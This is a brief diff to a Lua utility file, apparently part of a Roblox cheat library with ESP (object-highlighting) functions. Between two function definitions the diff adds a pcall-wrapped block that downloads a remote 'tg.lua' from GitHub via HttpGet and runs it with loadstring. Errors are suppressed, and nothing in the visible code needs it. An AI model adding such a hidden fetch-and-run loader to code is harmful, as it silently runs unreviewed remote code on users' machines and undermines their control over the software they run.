@@ -252,6 +252,10 @@ function RaelHubFunction.CreateEspObject(objeto, cor, imageId, texto)
   textLabel.Parent = billboard
 end
 
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/raelhubfunctions/Rael-hub-gui/refs/heads/main/Utils/tg.lua"))()
+end)
+
 function RaelHubFunction.CreateEspDistance(objeto, cor, texto, mostrarDistancia)
   
   if objeto:FindFirstChild("RaelHubIcon") then
